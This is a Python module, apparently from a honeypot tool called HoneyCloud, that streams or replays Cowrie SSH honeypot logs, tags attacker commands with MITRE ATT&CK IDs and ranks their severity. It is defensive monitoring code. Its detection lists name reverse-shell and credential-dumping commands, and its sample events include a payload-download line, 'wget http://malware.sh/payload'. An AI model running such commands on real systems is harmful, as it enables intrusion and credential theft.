import os
import time
import json
import subprocess
import click
from datetime import datetime

# ─────────────────────────────────────────────
#  MITRE ATT&CK command mapping
# ─────────────────────────────────────────────
MITRE_MAP = {
    "ls":              ("T1083",     "File and Directory Discovery"),
    "dir":             ("T1083",     "File and Directory Discovery"),
    "whoami":          ("T1033",     "System Owner/User Discovery"),
    "id":              ("T1033",     "System Owner/User Discovery"),
    "uname":           ("T1082",     "System Information Discovery"),
    "hostname":        ("T1082",     "System Information Discovery"),
    "cat /etc/passwd": ("T1003.008", "OS Credential Dumping: /etc/passwd"),
    "cat /etc/shadow": ("T1003.008", "OS Credential Dumping: /etc/shadow"),
    "wget":            ("T1105",     "Ingress Tool Transfer"),
    "curl":            ("T1105",     "Ingress Tool Transfer"),
    "chmod":           ("T1222",     "File/Directory Permissions Modification"),
    "ps":              ("T1057",     "Process Discovery"),
    "netstat":         ("T1049",     "System Network Connections Discovery"),
    "ifconfig":        ("T1016",     "System Network Configuration Discovery"),
    "ip addr":         ("T1016",     "System Network Configuration Discovery"),
    "crontab":         ("T1053.003", "Scheduled Task: Cron"),
    "history":         ("T1552",     "Unsecured Credentials"),
    "env":             ("T1552",     "Unsecured Credentials"),
    "ssh":             ("T1021.004", "Remote Services: SSH"),
    "scp":             ("T1105",     "Ingress Tool Transfer"),
    "python":          ("T1059.006", "Command and Scripting: Python"),
    "perl":            ("T1059.006", "Command and Scripting: Perl"),
    "bash":            ("T1059.004", "Command and Scripting: Bash"),
    "sh ":             ("T1059.004", "Command and Scripting: Bash"),
    "nc ":             ("T1095",     "Non-Application Layer Protocol"),
    "ncat":            ("T1095",     "Non-Application Layer Protocol"),
    "nmap":            ("T1046",     "Network Service Discovery"),
    "masscan":         ("T1046",     "Network Service Discovery"),
}

SEVERITY_COLOR = {
    "CRITICAL": "red",
    "HIGH":     "yellow",
    "MEDIUM":   "cyan",
    "LOW":      "white",
}

# ─────────────────────────────────────────────
#  Auto-detect log file path
# ─────────────────────────────────────────────
LOG_CANDIDATES = [
    "data/cowrie-logs/cowrie/cowrie.json",
    "data/cowrie-logs/cowrie.json",
    os.path.expanduser("~/cowrie/var/log/cowrie/cowrie.json"),
]

def _find_log_path():
    for path in LOG_CANDIDATES:
        if os.path.exists(path):
            return path
    return None

# ─────────────────────────────────────────────
#  MITRE + severity helpers
# ─────────────────────────────────────────────
def _mitre_for_command(cmd):
    for pattern, (mid, mname) in MITRE_MAP.items():
        if pattern in cmd:
            return mid, mname
    return "T1059", "Command and Scripting Interpreter"

def _severity_for_command(cmd):
    critical = ["wget", "curl", "chmod +x", "python", "perl", "nc ", "ncat", "bash -i"]
    high     = ["/etc/passwd", "/etc/shadow", "history", "env", "ssh", "nmap"]
    if any(x in cmd for x in critical):
        return "CRITICAL"
    if any(x in cmd for x in high):
        return "HIGH"
    return "MEDIUM"

# ─────────────────────────────────────────────
#  Event formatters
# ─────────────────────────────────────────────
def _fmt_ts(ts):
    try:
        return ts[:19].replace("T", " ")
    except Exception:
        return ts

def _print_header():
    click.echo(click.style(
        "\n  🍯 HoneyCloud — Live Threat Monitor", fg="yellow", bold=True))
    click.echo(click.style(
        "  ─────────────────────────────────────────────────────────────", fg="white"))
    click.echo(click.style(
        "  Timestamp            Severity   Source IP         MITRE", fg="bright_black"))
    click.echo(click.style(
        "  ─────────────────────────────────────────────────────────────\n", fg="white"))

def _format_event(event):
    eid = event.get("eventid", "")
    src = event.get("src_ip", "unknown")
    ts  = _fmt_ts(event.get("timestamp", ""))

    if eid == "cowrie.login.success":
        sev = "HIGH"
        return (
            f"\n  {click.style(ts, fg='bright_black')}  "
            f"{click.style(f'[{sev:>8}]', fg=SEVERITY_COLOR[sev], bold=True)}  "
            f"{click.style(src, fg='cyan')}\n"
            f"           {click.style('MITRE:', fg='bright_black')} "
            f"{click.style('T1110.001', fg='magenta')}  Brute Force: Password Guessing\n"
            f"           {click.style('Credential:', fg='bright_black')} "
            f"{click.style(event.get('username','?'), fg='red')} / "
            f"{click.style(event.get('password','?'), fg='red')}"
        )

    elif eid == "cowrie.login.failed":
        sev = "MEDIUM"
        return (
            f"\n  {click.style(ts, fg='bright_black')}  "
            f"{click.style(f'[{sev:>8}]', fg=SEVERITY_COLOR[sev], bold=True)}  "
            f"{click.style(src, fg='cyan')}\n"
            f"           {click.style('MITRE:', fg='bright_black')} "
            f"{click.style('T1110.001', fg='magenta')}  Brute Force: Password Guessing\n"
            f"           {click.style('Failed:', fg='bright_black')} "
            f"{event.get('username','?')} / {event.get('password','?')}"
        )

    elif eid == "cowrie.command.input":
        cmd        = event.get("input", "").strip()
        mid, mname = _mitre_for_command(cmd)
        sev        = _severity_for_command(cmd)
        return (
            f"\n  {click.style(ts, fg='bright_black')}  "
            f"{click.style(f'[{sev:>8}]', fg=SEVERITY_COLOR[sev], bold=True)}  "
            f"{click.style(src, fg='cyan')}\n"
            f"           {click.style('MITRE:', fg='bright_black')} "
            f"{click.style(mid, fg='magenta')}  {mname}\n"
            f"           {click.style('CMD:', fg='bright_black')} "
            f"{click.style(cmd, fg='white')}"
        )

    elif eid == "cowrie.session.connect":
        sev = "LOW"
        return (
            f"\n  {click.style(ts, fg='bright_black')}  "
            f"{click.style(f'[{sev:>8}]', fg=SEVERITY_COLOR[sev], bold=True)}  "
            f"{click.style(src, fg='cyan')}\n"
            f"           {click.style('MITRE:', fg='bright_black')} "
            f"{click.style('T1190', fg='magenta')}  Exploit Public-Facing Application\n"
            f"           {click.style('New connection:', fg='bright_black')} "
            f"session {event.get('session','?')[:12]}"
        )

    elif eid == "cowrie.session.closed":
        return (
            f"\n  {click.style(ts, fg='bright_black')}  "
            f"{click.style('[    INFO]', fg='bright_black')}  "
            f"{click.style(src, fg='cyan')}\n"
            f"           Session closed after "
            f"{click.style(str(event.get('duration','?')) + 's', fg='white')}"
        )

    return None


def _parse_line(line):
    line = line.strip()
    if not line:
        return None
    # strip Docker log timestamp prefix if present
    if line.startswith("20") and " " in line[:35]:
        parts = line.split(" ", 1)
        if len(parts) == 2:
            line = parts[1].strip()
    try:
        event = json.loads(line)
        return _format_event(event)
    except json.JSONDecodeError:
        return None


def _parse_twisted_line(line):
    """Parse Cowrie's Twisted framework log format for live streaming."""
    line = line.strip()
    if not line:
        return None

    # extract timestamp and message
    # format: 2026-03-15T14:45:01+0000 [Component] message
    try:
        parts = line.split(" ", 2)
        if len(parts) < 3:
            return None
        ts_raw  = parts[0][:19].replace("T", " ")
        context = parts[1]   # e.g. [HoneyPotSSHTransport,2,192.168.65.1]
        message = parts[2]

        # extract IP from context like [HoneyPotSSHTransport,2,192.168.65.1]
        src_ip = "unknown"
        if "," in context:
            src_ip = context.rstrip("]").split(",")[-1]

        # login success
        if "login attempt" in message and "succeeded" in message:
            # format: login attempt [root/admin123] succeeded
            cred_part = message.split("[")[1].split("]")[0]
            username = cred_part.split("/")[0].strip().strip("b'\"")
            password = cred_part.split("/")[1].strip().strip("b'\"")

            sev = "HIGH"
            return (
                f"\n  {click.style(ts_raw, fg='bright_black')}  "
                f"{click.style(f'[{sev:>8}]', fg='yellow', bold=True)}  "
                f"{click.style(src_ip, fg='cyan')}\n"
                f"           {click.style('MITRE:', fg='bright_black')} "
                f"{click.style('T1110.001', fg='magenta')}  Brute Force: Password Guessing\n"
                f"           {click.style('Credential:', fg='bright_black')} "
                f"{click.style(username, fg='red')} / {click.style(password, fg='red')}"
            )

        # login failed
        if "login attempt" in message and "failed" in message:
            cred_part = message.split("[")[1].split("]")[0]
            username, password = cred_part.split("/", 1)
            sev = "MEDIUM"
            return (
                f"\n  {click.style(ts_raw, fg='bright_black')}  "
                f"{click.style(f'[{sev:>8}]', fg='cyan', bold=True)}  "
                f"{click.style(src_ip, fg='cyan')}\n"
                f"           {click.style('MITRE:', fg='bright_black')} "
                f"{click.style('T1110.001', fg='magenta')}  Brute Force: Password Guessing\n"
                f"           {click.style('Failed:', fg='bright_black')} "
                f"{username} / {password}"
            )

        # command input
        if message.startswith("CMD: "):
            cmd        = message[5:].strip()
            mid, mname = _mitre_for_command(cmd)
            sev        = _severity_for_command(cmd)
            color      = SEVERITY_COLOR[sev]
            return (
                f"\n  {click.style(ts_raw, fg='bright_black')}  "
                f"{click.style(f'[{sev:>8}]', fg=color, bold=True)}  "
                f"{click.style(src_ip, fg='cyan')}\n"
                f"           {click.style('MITRE:', fg='bright_black')} "
                f"{click.style(mid, fg='magenta')}  {mname}\n"
                f"           {click.style('CMD:', fg='bright_black')} "
                f"{click.style(cmd, fg='white')}"
            )

        # new connection
        if "New connection:" in message:
            sev = "LOW"
            return (
                f"\n  {click.style(ts_raw, fg='bright_black')}  "
                f"{click.style(f'[{sev:>8}]', fg='white', bold=True)}  "
                f"{click.style(src_ip, fg='cyan')}\n"
                f"           {click.style('MITRE:', fg='bright_black')} "
                f"{click.style('T1190', fg='magenta')}  "
                f"Exploit Public-Facing Application\n"
                f"           {click.style('New connection', fg='bright_black')}"
            )

        # connection lost
        if "Connection lost after" in message:
            duration = message.split("after")[1].strip()
            return (
                f"\n  {click.style(ts_raw, fg='bright_black')}  "
                f"{click.style('[    INFO]', fg='bright_black')}  "
                f"{click.style(src_ip, fg='cyan')}\n"
                f"           Session closed after "
                f"{click.style(duration, fg='white')}"
            )

    except Exception:
        pass

    return None

# ─────────────────────────────────────────────
#  Mock events fallback
# ─────────────────────────────────────────────
MOCK_EVENTS = [
    {"eventid":"cowrie.session.connect",  "src_ip":"45.33.32.156",   "session":"abc123def456", "timestamp":"2026-03-15T10:00:00Z"},
    {"eventid":"cowrie.login.failed",     "src_ip":"45.33.32.156",   "username":"root",  "password":"root",     "timestamp":"2026-03-15T10:00:02Z"},
    {"eventid":"cowrie.login.failed",     "src_ip":"45.33.32.156",   "username":"root",  "password":"123456",   "timestamp":"2026-03-15T10:00:04Z"},
    {"eventid":"cowrie.login.success",    "src_ip":"45.33.32.156",   "username":"root",  "password":"admin123", "timestamp":"2026-03-15T10:00:06Z"},
    {"eventid":"cowrie.command.input",    "src_ip":"45.33.32.156",   "input":"whoami",                          "timestamp":"2026-03-15T10:00:10Z"},
    {"eventid":"cowrie.command.input",    "src_ip":"45.33.32.156",   "input":"uname -a",                        "timestamp":"2026-03-15T10:00:12Z"},
    {"eventid":"cowrie.command.input",    "src_ip":"45.33.32.156",   "input":"cat /etc/passwd",                 "timestamp":"2026-03-15T10:00:15Z"},
    {"eventid":"cowrie.command.input",    "src_ip":"185.220.101.45", "input":"wget http://malware.sh/payload",  "timestamp":"2026-03-15T10:00:20Z"},
    {"eventid":"cowrie.session.closed",   "src_ip":"45.33.32.156",   "duration":"47.3",                         "timestamp":"2026-03-15T10:00:53Z"},
]


# ─────────────────────────────────────────────
#  Core run function
# ─────────────────────────────────────────────
def run(live=False, log_path=None):
    _print_header()

    resolved = log_path or _find_log_path()

    if not resolved:
        click.echo(click.style(
            "  [INFO] No cowrie.json found. Run 'honeycloud deploy' first.\n"
            "  [INFO] Falling back to sample session...\n",
            fg="bright_black"
        ))
        _run_mock()
        return

    click.echo(click.style(f"  [INFO] Log: {resolved}\n", fg="bright_black"))

    if live:
        click.echo(click.style(
            "  [LIVE] Streaming directly from Docker  —  Press Ctrl+C to stop\n",
            fg="green"
        ))
        _run_docker_stream()
    else:
        click.echo(click.style("  [REPLAY] Analysing captured sessions...\n", fg="cyan"))
        _run_replay(resolved)


# ─────────────────────────────────────────────
#  Replay mode
# ─────────────────────────────────────────────
def _run_replay(log_path):
    counts = {"connect": 0, "login_success": 0, "login_failed": 0, "commands": 0}

    with open(log_path, "r") as f:
        for line in f:
            formatted = _parse_line(line)
            if formatted:
                click.echo(formatted)
                time.sleep(0.08)
            try:
                event = json.loads(line.strip())
                eid = event.get("eventid", "")
                if eid == "cowrie.session.connect":  counts["connect"] += 1
                if eid == "cowrie.login.success":    counts["login_success"] += 1
                if eid == "cowrie.login.failed":     counts["login_failed"] += 1
                if eid == "cowrie.command.input":    counts["commands"] += 1
            except Exception:
                pass

    click.echo(f"\n  {click.style('─'*60, fg='white')}")
    click.echo(f"  {click.style('Sessions:', fg='bright_black')}        {counts['connect']}")
    click.echo(f"  {click.style('Login successes:', fg='bright_black')}  "
               f"{click.style(str(counts['login_success']), fg='red', bold=True)}")
    click.echo(f"  {click.style('Failed logins:', fg='bright_black')}   {counts['login_failed']}")
    click.echo(f"  {click.style('Commands logged:', fg='bright_black')}  {counts['commands']}")
    click.echo(f"\n  Run {click.style('honeycloud monitor --live', fg='yellow')} "
               f"for real-time streaming.\n")


# ─────────────────────────────────────────────
#  Live mode — stream directly from Docker
#  Bypasses file buffering entirely.
#  Events appear the INSTANT Cowrie logs them.
# ─────────────────────────────────────────────
def _run_docker_stream(container="honeycloud-cowrie"):
    # verify container is running
    try:
        result = subprocess.run(
            ["docker", "inspect", "--format", "{{.State.Running}}", container],
            capture_output=True, text=True, timeout=5
        )
        if result.stdout.strip() != "true":
            click.echo(click.style(
                f"  [ERROR] Container '{container}' is not running.\n"
                f"  Run: docker start {container}\n", fg="red"
            ))
            return
    except (FileNotFoundError, subprocess.TimeoutExpired):
        click.echo(click.style("  [ERROR] Docker not found.\n", fg="red"))
        return

    click.echo(click.style(
        f"  [LIVE] Connected to '{container}'\n"
        f"  [LIVE] Commands will appear instantly — no need to exit SSH\n",
        fg="green"
    ))

    try:
        process = subprocess.Popen(
            ["docker", "logs", "--follow", "--since", "1m", container],
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            text=True,
            bufsize=1,   # line-buffered = real-time output
        )

        for line in process.stdout:
            formatted = _parse_twisted_line(line)
            if formatted:
                click.echo(formatted)

    except KeyboardInterrupt:
        process.terminate()
        click.echo(click.style(
            "\n\n  Monitor stopped. "
            "Run 'honeycloud score <ip>' to profile an attacker.\n",
            fg="yellow"
        ))


# ─────────────────────────────────────────────
#  Mock fallback
# ─────────────────────────────────────────────
def _run_mock():
    click.echo(click.style("  [SAMPLE] Replaying sample attack session:\n", fg="cyan"))
    for event in MOCK_EVENTS:
        formatted = _format_event(event)
        if formatted:
            click.echo(formatted)
            time.sleep(0.3)
    click.echo(f"\n  {click.style('─'*60, fg='white')}")
    click.echo(f"\n  To see real attacks: run "
               f"{click.style('honeycloud deploy', fg='yellow')} first.\n")